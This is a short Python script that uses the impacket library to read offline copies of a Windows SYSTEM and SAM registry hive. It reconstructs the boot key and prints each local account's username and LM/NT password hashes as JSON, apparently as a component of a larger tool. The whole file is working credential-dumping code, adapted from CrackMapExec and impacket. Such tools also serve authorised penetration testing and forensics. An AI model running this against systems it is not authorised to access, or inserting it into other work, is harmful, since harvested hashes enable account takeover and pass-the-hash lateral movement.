import sys
from impacket.examples.secretsdump import LocalOperations, SAMHashes
from impacket import winregistry
from binascii import hexlify, unhexlify
from six import b
import json

def main(sysF, samF):
    bootkey = getBootKey(sysF)

    #Borrowed code from https://github.com/byt3bl33d3r/CrackMapExec/blob/48fd338d228f6589928d5e7922df4c7cd240a287/cme/protocols/smb.py#L816
    #Changed to save the hashes as a JSON object as this will be needed for our Golang structs
    def print_sam_hash(sam_hash):
        print_sam_hash.sam_hashes += 1
        username,_,lmhash,nthash,_,_,_ = sam_hash.split(':')
        hash_dict = {'Username':username, 'NTLM':lmhash+':'+nthash}
        print(json.dumps(hash_dict))
    print_sam_hash.sam_hashes = 0

    SAM = SAMHashes(samF, bootkey, isRemote=False, perSecretCallback=lambda secret: print_sam_hash(secret))
    SAM.dump()

# From Impacket https://github.com/SecureAuthCorp/impacket/blob/69fee03fd8c120ec7ed0b1e630f7dcc5780fa3f9/impacket/examples/secretsdump.py#L735
def getBootKey(system):
        # Local Version whenever we are given the files directly
        bootKey = b''
        tmpKey = b''
        winreg = winregistry.Registry(system, False)
        # We gotta find out the Current Control Set
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = "ControlSet%03d" % currentControlSet
        for key in ['JD', 'Skew1', 'GBG', 'Data']:
            ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet, key))
            digit = ans[:16].decode('utf-16le')
            tmpKey = tmpKey + b(digit)

        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]

        tmpKey = unhexlify(tmpKey)

        for i in range(len(tmpKey)):
            bootKey += tmpKey[transforms[i]:transforms[i] + 1]

        return bootKey

if __name__ == "__main__":
    main(sys.argv[1], sys.argv[2])